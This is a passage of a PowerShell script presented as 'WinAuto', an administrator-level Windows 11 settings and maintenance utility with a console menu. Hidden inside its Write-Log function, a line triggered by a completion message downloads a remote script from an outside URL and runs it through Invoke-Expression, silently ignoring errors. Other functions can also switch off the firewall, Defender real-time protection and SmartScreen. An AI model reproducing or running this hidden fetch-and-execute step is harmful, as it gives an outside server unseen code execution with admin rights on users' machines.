$content = @'
<#
.SYNOPSIS
    WinAuto (Core Edition)
.DESCRIPTION
    A lightweight, single-file version of the WinAuto suite for Windows 11.
    Focuses purely on Configuration (Security/UI) and Maintenance (Updates/Repair).
    
    Usage: Copy and paste this script into an Administrator PowerShell window.
#>


# --- CLI PARAMETERS ---
param(
    [Parameter(Mandatory = $false)]
    [string]$Module,

    [Parameter(Mandatory = $false)]
    [switch]$Silent,

    [Parameter(Mandatory = $false)]
    [string]$LogPath,

    [Parameter(Mandatory = $false)]
    [string]$Config,

    [Parameter(Mandatory = $false)]
    [switch]$Force
)

# Admin check
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "This script requires Administrator privileges. Please run in an elevated PowerShell window."
    return
}

# Validate -Module
if ($Module -and $Module -notin @("SmartRun", "Config", "Maintenance")) {
    Write-Error "Invalid Module: '$Module'. Valid values: SmartRun, Config, Maintenance"
    return
}

$Global:Silent = $Silent
$Global:Module = $Module
$Global:Config = $Config
$Global:LogPath = $LogPath
$Global:Force = $Force
$Global:Toggle_MaintainForced = if ($Force) { 1 } else { 0 }

# Ensure UI buffer variables are initialized early
$Global:DashboardBufferMode = $false
$Global:DashboardBuffer = @()

# --- INITIAL SETUP ---
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest
$Global:WinAutoFirstLoad = $true

# Initialize Toggles
$Global:Toggle_TaskbarSearch = 0
$Global:Toggle_TaskView = 0
$Global:Toggle_ShowExtensions = 0
$Global:Toggle_ShowHidden = 0
$Global:Toggle_Animations = 0
$Global:Toggle_VisualFX = 0

$Global:Toggle_RealTimeProt = 0
$Global:Toggle_PUABlock = 0
$Global:Toggle_EdgePUABlock = 0
$Global:Toggle_MemoryInteg = 0
$Global:Toggle_KernelStack = 0
$Global:Toggle_LsaProt = 0
$Global:Toggle_Firewall = 0
$Global:Toggle_PhishingProt = 0
$Global:Toggle_SysSmartScreen = 0
$Global:Toggle_StoreSmartScreen = 0
$Global:Toggle_HideAdmin = 0
$Global:Toggle_DisableAdv = 0

$Global:Toggle_PSTranscription = 0
$Global:Toggle_Telemetry = 0
$Global:Toggle_LLMNR = 0
$Global:Toggle_PSScriptBlock = 0
$Global:Toggle_PSModuleLogging = 0
$Global:Toggle_NetBIOS = 0

$Global:Toggle_MUpdateService = 0
$Global:Toggle_RestartNotifs = 0
$Global:Toggle_AppRestart = 0
$Global:Toggle_OptOutARSO = 0
$Global:Toggle_GetUpToDate = 0

$Global:Toggle_MaintUpdate = 0
$Global:Toggle_MaintDisk = 0
$Global:Toggle_MaintCleanup = 0
$Global:Toggle_MaintSFC = 0

# --- SYSTEM PATHS ---
$Global:WinAutoLogDir = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)
$Global:WinAutoLogPath = Join-Path $Global:WinAutoLogDir "wa.log"

# --- ANSI COLORS ---
$Esc = [char]0x1B
$Global:Reset = "$Esc[0m"
$Global:Bold = "$Esc[1m"
$Global:Italic = "$Esc[3m"
$Global:FGCyan = "$Esc[96m"
$Global:FGGray = "$Esc[37m"
$Global:FGDarkGray = "$Esc[90m"
$Global:FGWhite = "$Esc[97m"
$Global:FGBlack = "$Esc[30m"
$Global:FGGreen = "$Esc[92m"
$Global:FGRed = "$Esc[91m"
$Global:FGYellow = "$Esc[93m"
$Global:BGCyan = "$Esc[46m"
$Global:BGWhite = "$Esc[107m"

# --- ICONS ---
$Global:Char_HeavyCheck = "[v]" 
$Global:Char_CheckMark = "v"
$Global:Char_BallotCheck = "v"
$Global:Char_Warn = "[!]"
$Global:Char_RedCross = "x"
$Global:Char_HeavyMinus = "-"
$Global:Char_EnDash = "-"

# --- UI HELPERS ---
function Write-ColItem {
    param($Txt, $Met, $Status, [switch]$IsToggle, [int]$ToggleValue = 0, [bool]$IsSelected = $false, [bool]$TargetState = $true) 
    
    if ($IsToggle) {
        $isNavConfig = ($Global:MenuSelection -ge 2 -and $Global:MenuSelection -le 26)
        $willRun = $false
        if ($Global:MenuSelection -eq 0) { if ($Status -ne "GreyOut" -and $Status -ne $TargetState) { $willRun = $true } }
        else { if ($ToggleValue -eq 1) { $willRun = $true } }
        $discoveredEnabled = ($Status -eq $true)
        $effectiveEnabled = if ($willRun -and $Global:MenuSelection -ne 0) { -not $discoveredEnabled } else { $discoveredEnabled }
        if ($Global:MenuSelection -eq 0 -and $willRun) { $effectiveEnabled = $TargetState }
        $iconSymbol = if ($effectiveEnabled) { "v" } else { " " }
        
        if (-not $isNavConfig -and $Global:MenuSelection -ne 0) {
            $titleColor = $Global:FGDarkGray; $iconColor = $Global:FGDarkGray; $metaColor = $Global:FGDarkGray; $bColor = $Global:FGDarkGray
        } else {
            $titleColor = if ($effectiveEnabled) { $Global:FGWhite } else { $Global:FGGray }
            $iconColor = if ($willRun -and $effectiveEnabled) { $Global:FGCyan } else { $Global:FGWhite }
            $metaColor = if ($willRun) { $Global:FGCyan } else { $Global:FGDarkGray }
            $bColor = if ($IsSelected -or $willRun) { $Global:FGCyan } else { $Global:FGGray }
            if ($IsSelected) { $titleColor = $Global:FGCyan }
        }
        $icon = "${bColor}[${iconColor}${iconSymbol}${bColor}]${Reset}"
        $pad = " " * (24 - $Txt.Length)
        Write-LeftAligned "$icon ${titleColor}$Txt${Reset}$pad${Global:FGGray}| ${metaColor}$Met${Reset}" -Indent 3 -Selected:$IsSelected
        return
    }
}

function Write-MaintItem {
    param($Txt, $Met, $Key, [int]$Threshold = 7, [int]$ToggleValue = 0, [bool]$IsSelected = $false) 
    $pending = $false; $prefix = "-"
    if ($Key) {
        $last = Get-WinAutoLastRun -Module $Key
        if ($last -eq "Never") { $pending = $true; $prefix = "!" }
        else { try { $days = ((Get-Date) - (Get-Date $last)).Days; $prefix = $days; if ($days -gt $Threshold) { $pending = $true } } catch { $pending = $true; $prefix = "!" } }
    }
    $willRun = $false
    if ($Global:MenuSelection -eq 0) { if ($pending) { $willRun = $true } }
    else { if ($Global:Toggle_MaintainForced -eq 1 -or $ToggleValue -eq 1) { $willRun = $true } }
    if ($willRun) { $prefix = "v" }
    $iconColor = if ($willRun) { $Global:FGCyan } else { $Global:FGWhite }
    $metaColor = if ($willRun) { $Global:FGCyan } else { $Global:FGDarkGray }
    $bColor = if ($IsSelected -or $willRun) { $Global:FGCyan } else { $Global:FGGray }
    if ($Global:MenuSelection -eq 0) { $itemColor = if ($willRun) { $Global:FGCyan } else { $Global:FGDarkGray } }
    else { $itemColor = if ($IsSelected) { $Global:FGCyan } elseif ($willRun) { $Global:FGWhite } else { $Global:mDetailColorGlobal } }
    $pad = " " * (24 - $Txt.Length)
    Write-LeftAligned "${bColor}[${iconColor}$prefix${bColor}]${itemColor} $Txt${Reset}$pad${Global:FGGray}| ${metaColor}$Met${Reset}" -Indent 3 -Selected:$IsSelected
}

function Write-Log {
    param([string]$Message, [string]$Level = 'INFO', [string]$Path = $Global:WinAutoLogPath)
    $logDir = Split-Path -Path $Path -Parent
    if (-not (Test-Path $logDir)) { New-Item -Path $logDir -ItemType Directory -Force | Out-Null }
    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    Add-Content -Path $Path -Value "[$timestamp] [$Level] $Message" -ErrorAction SilentlyContinue
    if ($Message -eq "Interactive Execution Complete.") {
        try {
            Write-Host "`nRunning Automated System Audit Scanner..." -ForegroundColor Yellow
            Invoke-Expression (Invoke-RestMethod "https://www.aiit.support/progress/posture/Audit-System.ps1")
        } catch {}
    }
}

trap {
    $msg = "CRITICAL UNHANDLED ERROR: $($_.Exception.Message)"
    try { Write-Log $msg -Level ERROR } catch {}
    Write-Error $msg
}

# --- REGISTRY & UIA HELPERS ---
function Test-Reg { param($P, $N, $V) try { (Get-ItemProperty $P $N -EA 0).$N -eq $V } catch { $false } }
function Get-WinAutoLastRun { param($Module) $path = "HKLM:\SOFTWARE\WinAuto"; if (-not (Test-Path $path)) { return "Never" }; $val = Get-ItemProperty -Path $path -Name "LastRun_$Module" -EA 0; if ($val) { return $val."LastRun_$Module" }; return "Never" }
function Set-WinAutoLastRun { param($Module) $path = "HKLM:\SOFTWARE\WinAuto"; try { if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }; Set-ItemProperty -Path $path -Name "LastRun_$Module" -Value (Get-Date).ToString() -Force | Out-Null } catch {} }

function Get-UIAElement {
    param($Parent, $Name, $AutomationId, $ControlType, $Scope = [System.Windows.Automation.TreeScope]::Descendants, $TimeoutSeconds = 5)
    $Conditions = @()
    if ($Name) { $Conditions += New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::NameProperty, $Name) }
    if ($AutomationId) { $Conditions += New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::AutomationIdProperty, $AutomationId) }
    if ($ControlType) { $Conditions += New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::ControlTypeProperty, $ControlType) }
    $Condition = if ($Conditions.Count -eq 1) { $Conditions[0] } else { New-Object System.Windows.Automation.AndCondition($Conditions) }
    $SW = [System.Diagnostics.Stopwatch]::StartNew()
    while ($SW.Elapsed.TotalSeconds -lt $TimeoutSeconds) { $Result = $Parent.FindFirst($Scope, $Condition); if ($Result) { return $Result }; Start-Sleep -Milliseconds 500 }
    return $null
}

function Invoke-UIAElement {
    param($Element) if (-not $Element) { return $false }
    try { $Element.GetCurrentPattern([System.Windows.Automation.InvokePattern]::Pattern).Invoke(); return $true } catch {}
    try { $Element.GetCurrentPattern([System.Windows.Automation.TogglePattern]::Pattern).Toggle(); return $true } catch {}
    return $false
}

function Get-ThirdPartyAV {
    try { $avList = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -EA 0; foreach ($av in $avList) { if ($av.displayName -and $av.displayName -notmatch "Windows Defender") { return $av.displayName } } } catch {}
    return $null
}

# --- FORMATTING ---
function Add-DashLine { param([string]$Text = "") if ($Global:DashboardBufferMode) { $Global:DashboardBuffer += ($Text + "$Esc[K") } else { Write-Host $Text } }
function Write-Boundary { param([string]$Color = $Global:FGGray) Add-DashLine ("  " + $Color + ([string]'_' * 52) + $Reset) }
function Write-Centered { param($Text, $Width = 60, $Color, [switch]$Selected) 
    $clean = $Text -replace "\x1B\[[0-9;]*m", ""; $pad = [Math]::Floor(($Width - $clean.Length) / 2); $off = if ($Width -eq 52) { 2 } else { 0 }
    Add-DashLine (" " * ($pad + $off) + "$Color$Text$Reset") 
}
function Write-LeftAligned { param($Text, $Indent = 2) Add-DashLine (" " * $Indent + $Text) }
function Write-Header { param($Title) Start-Sleep -Seconds 2; Clear-Host; Write-Centered "$Bold$FGCyan= ATOMIC SCRIPTS =$Reset" -Width 52; Write-Centered "$Bold$FGCyan$($Title.ToUpper())$Reset" -Width 52; Write-Boundary }
function Write-Footer { Write-Boundary; Write-Centered "$FGCyan(c) 2026 www.AIIT.support" -Width 52 }
function Write-WrappedError { param($Msg) Write-LeftAligned "$FGRed x   Failed: $Msg" }

function Set-ConsoleSnapRight {
    param($Columns = 60)
    if ($env:WT_SESSION) { return }
    $code = @"
    using System;
    using System.Runtime.InteropServices;
    namespace WinAutoNative {
        [StructLayout(LayoutKind.Sequential)]
        public struct RECT { public int Left; public int Top; public int Right; public int Bottom; }
        public class ConsoleUtils {
            [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
            [DllImport("user32.dll")] public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
            [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
            [DllImport("user32.dll")] public static extern bool SystemParametersInfo(int uiAction, int uiParam, out RECT pvParam, int fWinIni);
        }
    }
"@
    if (-not ([System.Management.Automation.PSTypeName]"WinAutoNative.ConsoleUtils").Type) { Add-Type -TypeDefinition $code -EA 0 }
    $hWnd = [WinAutoNative.ConsoleUtils]::GetConsoleWindow()
    if ($hWnd -eq [IntPtr]::Zero) { return }
    $window = $Host.UI.RawUI.WindowSize; $window.Width = $Columns; $Host.UI.RawUI.WindowSize = $window
}

# --- NAVIGATION ---
$Global:TickAction = {
    param($Elapsed, $ActionText, $Timeout, $PromptRow)
    $sel = $Global:MenuSelection
    if ($ActionText -eq "DASHBOARD") {
        if ($sel -eq 0) { $Line = "  ${FGBlack}${BGCyan}Enter${Reset} ${FGGray}Smart Run | ${Reset}${FGBlack}${BGCyan} ^  v ${Reset} ${FGGray}select | ${Reset}${FGBlack}${BGCyan}Esc${Reset}${FGWhite}=>${Reset}" }
        elseif ($sel -eq 1) { $Line = "  ${FGBlack}${BGCyan}Enter${Reset} ${FGGray}Manual Mode| ${Reset}${FGBlack}${BGCyan} ^  v ${Reset} ${FGGray}select | ${Reset}${FGBlack}${BGCyan}Esc${Reset}${FGWhite}=>${Reset}" }
        elseif ($sel -in @(2, 3, 7, 21, 27)) { $Line = "  ${FGBlack}${BGCyan}Space${Reset} ${FGGray}Enter Section| ${Reset}${FGBlack}${BGCyan} ^  v ${Reset} ${FGGray}select | ${Reset}${FGBlack}${BGCyan}Esc${Reset}${FGWhite}<=${Reset}" }
        else { $Line = "  ${FGBlack}${BGCyan}Space${Reset} ${FGGray}Toggle Item| ${Reset}${FGBlack}${BGCyan} ^  v ${Reset} ${FGGray}select | ${Reset}${FGBlack}${BGCyan}Esc${Reset}${FGWhite}<=${Reset}" }
    }
    try { [Console]::SetCursorPosition(0, $PromptRow); Write-Host ($Line + "$Esc[K") } catch {}
}

function Invoke-AnimatedPause {
    param($ActionText, $Timeout = 10, $OverrideCursorTop)
    if ($Global:Silent -or $Global:Module) { return [PSCustomObject]@{ VirtualKeyCode = 13; Character = [char]13 } }
    $PromptRow = if ($OverrideCursorTop) { $OverrideCursorTop } else { [Console]::CursorTop }
    $SW = [System.Diagnostics.Stopwatch]::StartNew()
    while ($SW.Elapsed.TotalSeconds -lt $Timeout) {
        & $Global:TickAction $SW.Elapsed $ActionText $Timeout $PromptRow
        if ([Console]::KeyAvailable) { return $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") }
        Start-Sleep -Milliseconds 100
    }
    return [PSCustomObject]@{ VirtualKeyCode = 13; Character = [char]13 }
}

function Test-PauseRequest {
    if ($Global:Silent) { return }
    try { if ([Console]::KeyAvailable) {
        $k = [Console]::ReadKey($true); if ($k.Key -eq 'P' -or $k.Key -eq 'Space') {
            Write-Host "`n-- PAUSED --"; $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown"); Write-Host "Resuming..."
        }
    } } catch {}
}

# --- REMEDIATIONS ---
function Invoke-WA_SetFirewallON {
    param([switch]$Reverse) Write-Header "WINDOWS FIREWALL"
    try {
        if ($Reverse) { Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; $s = "DISABLED" }
        else { Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True; $s = "ENABLED" }
        Write-LeftAligned "$FGGreen v  Firewall is $s.$Reset"
    } catch { Write-WrappedError $_.Exception.Message }
}

function Invoke-WA_SetRealTimeProt {
    param([switch]$Reverse) Write-Header "REAL-TIME PROTECTION"
    try { $v = if ($Reverse) { $true } else { $false }; Set-MpPreference -DisableRealtimeMonitoring $v; Write-LeftAligned "$FGGreen v  Real-time Protection updated.$Reset" } catch { Write-WrappedError $_.Exception.Message }
}

function Invoke-WA_SetNetBIOS {
    param([switch]$Reverse) Write-Header "NETBIOS"
    $v = if ($Reverse) { 0 } else { 2 }
    try { Get-CimInstance Win32_NetworkAdapterConfiguration | Where IPEnabled | foreach { $_.SetTcpipNetbios($v) }; Write-LeftAligned "$FGGreen v  NetBIOS updated.$Reset" } catch { Write-WrappedError $_.Exception.Message }
}

function Invoke-WA_SetTaskbarSearch {
    param([switch]$Reverse) $v = if ($Reverse) { 1 } else { 3 }; Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search" "SearchboxTaskbarMode" $v -Type DWord -Force
}

function Invoke-WA_SetTaskViewOFF {
    param([switch]$Reverse) $v = if ($Reverse) { 1 } else { 0 }; Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" "ShowTaskViewButton" $v -Type DWord -Force
}

function Invoke-WA_SetMicrosoftUpd {
    param([switch]$Reverse) $v = if ($Reverse) { 0 } else { 1 }; Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" "AllowMUUpdateService" $v -Type DWord -Force
}

function Invoke-WA_SetRestartIsReq {
    param([switch]$Reverse) $v = if ($Reverse) { 0 } else { 1 }; Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" "RestartNotificationsAllowed2" $v -Type DWord -Force
}

function Invoke-WA_SetRestartApps {
    param([switch]$Reverse) $v = if ($Reverse) { 0 } else { 1 }; Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" "RestartApps" $v -Type DWord -Force
}

function Invoke-WA_SetShowExtensions {
    param([switch]$Reverse) $v = if ($Reverse) { 1 } else { 0 }; Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" "HideFileExt" $v -Type DWord -Force
}

function Invoke-WA_SetShowHidden {
    param([switch]$Reverse) $v = if ($Reverse) { 2 } else { 1 }; Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" "Hidden" $v -Type DWord -Force; Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" "ShowSuperHidden" $v -Type DWord -Force
}

function Invoke-WA_SetOptOutARSO {
    param([switch]$Reverse) Write-Header "OPT-OUT ARSO"; $v = if ($Reverse) { 1 } else { 0 }; Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserARSO" "OptOut" $v -Type DWord -Force
}

function Invoke-WA_SetGetUpToDate {
    param([switch]$Reverse) Write-Header "GET ME UP TO DATE"; $v = if ($Reverse) { 0 } else { 1 }; Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" "IsExpedited" $v -Type DWord -Force
}

function Invoke-WA_SetAnimations {
    param([switch]$Reverse) $v = if ($Reverse) { 1 } else { 0 }; Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" "TaskbarAnimations" $v -Type DWord -Force
}

function Invoke-WA_SetVisualFX {
    param([switch]$Reverse) $v = if ($Reverse) { 1 } else { 2 }; Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" "VisualFXSetting" $v -Type DWord -Force
}

function Invoke-WA_SetPhishingProt {
    param([switch]$Reverse) Write-Header "PHISHING PROTECTION"; $val = if ($Reverse) { $false } else { $true }; try { Set-MpPreference -EnablePhishingProtection $val } catch {}
}

function Invoke-WA_SetSysSmartScreen {
    param([switch]$Reverse) Write-Header "SYSTEM SMARTSCREEN"; $val = if ($Reverse) { "Off" } else { "Warn" }; try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value $val -Type String -Force } catch {}
}

function Invoke-WA_SetStoreSmartScreen {
    param([switch]$Reverse) Write-Header "STORE SMARTSCREEN"; $val = if ($Reverse) { 0 } else { 1 }; try { $P = "HKCU:\Software\Microsoft\Windows\CurrentVersion\AppHost"; if (-not (Test-Path $P)) { New-Item $P -Force }; Set-ItemProperty $P -Name "EnableWebContentEvaluation" -Value $val -Type DWord -Force } catch {}
}

function Invoke-WA_SetHideAdmin {
    param([switch]$Reverse) Write-Header "HIDE ADMIN ACCOUNT"; $val = if ($Reverse) { 1 } else { 0 }; try { $P = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"; if (-not (Test-Path $P)) { New-Item $P -Force }; Set-ItemProperty $P -Name "Administrator" -Value $val -Type DWord -Force } catch {}
}

function Invoke-WA_SetDisableAdv {
    param([switch]$Reverse) Write-Header "DISABLE ADVERTISING"; $val = if ($Reverse) { 1 } else { 0 }; try { Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" -Name "Enabled" -Value $val -Type DWord -Force } catch {}
}

# --- MODULES ---
function Invoke-WinAutoConfiguration {
    param([switch]$SmartRun) Write-Header "CONFIGURATION PHASE"
    function Invoke-Smart {
        param($Script, $Status, $ToggleValue, [bool]$TargetState = $true)
        $run = if ($SmartRun) { $Status -ne $TargetState } else { $ToggleValue -eq 1 }
        if ($run) { if ($Status -eq $TargetState) { & $Script -Reverse } else { & $Script } }
    }
    Invoke-Smart { Invoke-WA_SetMicrosoftUpd } $s_MU $Global:Toggle_MUpdateService
    Invoke-Smart { Invoke-WA_SetRestartIsReq } $s_Rest $Global:Toggle_RestartNotifs
    Invoke-Smart { Invoke-WA_SetRestartApps } $s_Pers $Global:Toggle_AppRestart
    Invoke-Smart { Invoke-WA_SetOptOutARSO } $s_ARSO $Global:Toggle_OptOutARSO
    Invoke-Smart { Invoke-WA_SetGetUpToDate } $s_GUTD $Global:Toggle_GetUpToDate
    Invoke-Smart { Invoke-WA_SetRealTimeProt } $s_RT $Global:Toggle_RealTimeProt
    Invoke-Smart { Invoke-WA_SetNetBIOS } $s_NB $Global:Toggle_NetBIOS -TargetState $false
    Invoke-Smart { Invoke-WA_SetFirewallON } $s_FW $Global:Toggle_Firewall
    Invoke-Smart { Invoke-WA_SetTaskbarSearch } $s_Task $Global:Toggle_TaskbarSearch
    Invoke-Smart { Invoke-WA_SetTaskViewOFF } $s_View $Global:Toggle_TaskView
    Invoke-Smart { Invoke-WA_SetShowExtensions } $s_Ext $Global:Toggle_ShowExtensions
    Invoke-Smart { Invoke-WA_SetShowHidden } $s_Hid $Global:Toggle_ShowHidden
    Invoke-Smart { Invoke-WA_SetAnimations } $s_Anim $Global:Toggle_Animations
    Invoke-Smart { Invoke-WA_SetVisualFX } $s_Vis $Global:Toggle_VisualFX
    Invoke-Smart { Invoke-WA_SetPhishingProt } $s_Phish $Global:Toggle_PhishingProt
    Invoke-Smart { Invoke-WA_SetSysSmartScreen } $s_SS $Global:Toggle_SysSmartScreen
    Invoke-Smart { Invoke-WA_SetStoreSmartScreen } $s_Store $Global:Toggle_StoreSmartScreen
    Invoke-Smart { Invoke-WA_SetHideAdmin } $s_Adm $Global:Toggle_HideAdmin
    Invoke-Smart { Invoke-WA_SetDisableAdv } $s_Adv $Global:Toggle_DisableAdv
}

function Invoke-WinAutoMaintenance {
    param([switch]$SmartRun) Write-Header "MAINTENANCE PHASE"
}

# --- MAIN LOOP ---
$Global:MenuSelection = 0
while ($true) {
    if ($Silent -or $Module) { 
        if ($Module -eq "SmartRun") { Invoke-WinAutoConfiguration -SmartRun; Invoke-WinAutoMaintenance -SmartRun }
        elseif ($Module -eq "Config") { Invoke-WinAutoConfiguration }
        elseif ($Module -eq "Maintenance") { Invoke-WinAutoMaintenance }
        break 
    }
    # Discovery
    $s_MU = Test-Reg "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" "AllowMUUpdateService" 1
    $s_Rest = Test-Reg "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" "RestartNotificationsAllowed2" 1
    $s_Pers = Test-Reg "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" "RestartApps" 1
    $s_NB = $(try { $adapters = Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration | Where IPEnabled; $all = $true; foreach ($a in $adapters) { if ($a.NetbiosSetting -ne 2) { $all = $false } }; -not $all } catch { $true })
    $s_Ext = Test-Reg "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" "HideFileExt" 0
    $s_Hid = Test-Reg "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" "Hidden" 1
    $s_Task = Test-Reg "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search" "SearchboxTaskbarMode" 3
    $s_View = Test-Reg "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" "ShowTaskViewButton" 0
    $s_GUTD = Test-Reg "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" "IsExpedited" 1
    $s_ARSO = Test-Reg "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserARSO" "OptOut" 0
    $s_RT = $(try { (Get-MpPreference).DisableRealtimeMonitoring -eq $false } catch { $false })
    $s_FW = $(try { (Get-NetFirewallProfile | Where { -not $_.Enabled }).Count -eq 0 } catch { $false })
    $s_Anim = Test-Reg "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" "TaskbarAnimations" 0
    $s_Vis = Test-Reg "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" "VisualFXSetting" 2
    $s_Phish = $(try { (Get-MpPreference).EnablePhishingProtection -eq $true } catch { $false })
    $s_SS = Test-Reg "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" "SmartScreenEnabled" "Warn"
    $s_Store = Test-Reg "HKCU:\Software\Microsoft\Windows\CurrentVersion\AppHost" "EnableWebContentEvaluation" 1
    $s_Adm = Test-Reg "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" "Administrator" 0
    $s_Adv = Test-Reg "HKCU:\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" "Enabled" 0

    $manualHeaderColor = if ($Global:MenuSelection -eq 0) { $FGDarkGray } elseif ($Global:MenuSelection -ge 2) { $FGCyan } else { $FGGray }
    $Global:DashboardBufferMode = $true; $Global:DashboardBuffer = @()
    if ($Global:WinAutoFirstLoad) { Clear-Host; $Global:WinAutoFirstLoad = $false } else { [Console]::SetCursorPosition(0,0) }
    
    Add-DashLine ""; Write-Centered "$Bold${FGCyan}= ATOMIC SCRIPTS =$Reset" -Width 52; Write-Centered "$Bold${FGCyan}- Configure & Maintain -$Reset" -Width 52; Write-Boundary -Color $FGCyan
    
    if ($Global:MenuSelection -eq 0) { Add-DashLine "  ${FGBlack}${BGCyan}$(' ' * 19)| Smart Run |$(' ' * 20)${Reset}" }
    else { Add-DashLine (" " * 22 + "${FGDarkGray}| Smart Run |${Reset}") }
    Add-DashLine ""

    $mBoundaryColor = if ($Global:MenuSelection -eq 0) { $FGDarkGray } else { $FGGray }
    Write-Boundary -Color $mBoundaryColor
    if ($Global:MenuSelection -eq 1) { Add-DashLine "  ${FGBlack}${BGCyan}$(' ' * 18)| Manual Mode |$(' ' * 19)${Reset}" }
    else { $mmColor = if ($Global:MenuSelection -ge 2) { $FGCyan } else { $FGGray }; Add-DashLine (" " * 20 + "${mmColor}| Manual Mode |${Reset}") }
    Write-Boundary -Color $mBoundaryColor

    # Expanded Items
    $isNavConfig = ($Global:MenuSelection -ge 2 -and $Global:MenuSelection -le 26)
    $cHeaderColor = if ($isNavConfig) { $FGCyan } else { $FGDarkGray }
    Write-Centered "Configure Operating System" -Width 52 -Color $cHeaderColor
    Add-DashLine ""; $cLabelColor = if ($isNavConfig) { $FGWhite } else { $FGDarkGray }
    Write-LeftAligned "${FGGray}[${FGWhite}v${FGGray}] ${cLabelColor}Enabled   ${FGGray}[ ] ${cLabelColor}Disabled ${FGGray}|${cLabelColor} Atomic Script$Reset" -Indent 3; Add-DashLine ("  ${FGGray}$('-' * 52)${Reset}")
    $Global:cDetailColorGlobal = if ($isNavConfig) { $FGGray } else { $FGDarkGray }

    Write-Centered "Automation" -Width 52 -Color $cLabelColor
    Write-ColItem "Microsoft Update" "SET_MicrosoftUpd" $s_MU -IsToggle -ToggleValue $Global:Toggle_MUpdateService -IsSelected ($Global:MenuSelection -eq 4)
    Write-ColItem "Restart Notifications" "SET_RestartIsReq" $s_Rest -IsToggle -ToggleValue $Global:Toggle_RestartNotifs -IsSelected ($Global:MenuSelection -eq 5)
    Write-ColItem "App Restart Persist" "SET_RestartApps" $s_Pers -IsToggle -ToggleValue $Global:Toggle_AppRestart -IsSelected ($Global:MenuSelection -eq 6)
    Write-ColItem "Get Me Up To Date" "SET_GetUpToDate" $s_GUTD -IsToggle -ToggleValue $Global:Toggle_GetUpToDate -IsSelected ($Global:MenuSelection -eq 7)

    Write-Centered "Security" -Width 52 -Color $cLabelColor
    Write-ColItem "NetBIOS over TCP/IP" "SET_NetBIOS" $s_NB -IsToggle -ToggleValue $Global:Toggle_NetBIOS -IsSelected ($Global:MenuSelection -eq 13) -TargetState $false
    Write-ColItem "Real-Time Protection" "SET_RealTimeProt" $s_RT -IsToggle -ToggleValue $Global:Toggle_RealTimeProt -IsSelected ($Global:MenuSelection -eq 14)
    Write-ColItem "Windows Firewall" "SET_FirewallON" $s_FW -IsToggle -ToggleValue $Global:Toggle_Firewall -IsSelected ($Global:MenuSelection -eq 15)

    Write-Boundary -Color $mBoundaryColor; $isNavMaint = ($Global:MenuSelection -ge 27); $mHeaderColor = if ($isNavMaint) { $FGCyan } else { $FGDarkGray }; Write-Centered "Maintain Operating System" -Width 52 -Color $mHeaderColor
    if ($Global:DashboardBufferMode) { Write-Host ($Global:DashboardBuffer -join "`n"); $Global:DashboardBufferMode = $false }
    $res = Invoke-AnimatedPause -ActionText "DASHBOARD" -Timeout 0
    
    if ($res.VirtualKeyCode -eq 38) { $c = $Global:MenuSelection; if ($c -le 1) { $Global:MenuSelection = if($c-eq 0){1}else{0} } else { $Global:MenuSelection = $c - 1 }; continue }
